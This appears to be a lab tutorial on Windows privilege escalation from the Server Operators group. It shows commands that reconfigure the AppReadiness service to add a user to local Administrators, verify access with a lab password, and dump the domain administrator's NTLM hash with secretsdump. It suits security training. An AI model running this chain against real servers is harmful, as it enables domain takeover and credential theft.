# Server Operators

***

{% hint style="warning" %}
The [Server Operators](https://docs.microsoft.com/en-us/windows/security/identity-protection/access-control/active-directory-security-groups#bkmk-serveroperators) group allows members to administer Windows servers without needing assignment of Domain Admin privileges. It is a very highly privileged group that can log in locally to servers, including Domain Controllers.

Membership of this group confers the powerful `SeBackupPrivilege` and `SeRestorePrivilege` privileges and the ability to control local services.
{% endhint %}

<mark style="color:green;">**Querying the AppReadiness Service**</mark>

```cmd-session
C:\htb> sc qc AppReadiness
```

<mark style="color:green;">**Checking Service Permissions with PsService**</mark>

We can use the service viewer/controller [PsService](https://docs.microsoft.com/en-us/sysinternals/downloads/psservice), which is part of the Sysinternals suite, to check permissions on the service. `PsService` works much like the `sc` utility and can display service status and configurations and also allow you to start, stop, pause, resume, and restart services both locally and on remote hosts.

```cmd-session
C:\htb> c:\Tools\PsService.exe security AppReadiness

PsService v2.25 - Service information and configuration utility
```

This confirms that the Server Operators group has [SERVICE\_ALL\_ACCESS](https://docs.microsoft.com/en-us/windows/win32/services/service-security-and-access-rights) access right, which gives us full control over this service.

<mark style="color:green;">**Checking Local Admin Group Membership**</mark>

```cmd-session
C:\htb> net localgroup Administrators
```

<mark style="color:green;">**Modifying the Service Binary Path**</mark>

{% code fullWidth="true" %}
```cmd-session
C:\htb> sc config AppReadiness binPath= "cmd /c net localgroup Administrators server_adm /add
```
{% endcode %}

<mark style="color:green;">**Starting the Service**</mark>

```cmd-session
C:\htb> sc start AppReadiness
```

<mark style="color:green;">**Confirming Local Admin Group Membership**</mark>

```cmd-session
C:\htb> net localgroup Administrators
```

<mark style="color:green;">**Confirming Local Admin Access on Domain Controller**</mark>

{% code fullWidth="true" %}
```shell-session
mrroboteLiot_1@htb[/htb]$ crackmapexec smb 10.129.43.9 -u server_adm -p 'HTB_@cademy_stdnt!'
```
{% endcode %}

<mark style="color:green;">**Retrieving NTLM Password Hashes from the Domain Controller**</mark>

{% code fullWidth="true" %}
```shell-session
mrroboteLiot_1@htb[/htb]$ secretsdump.py server_adm@10.129.43.9 -just-dc-user administrator
```
{% endcode %}
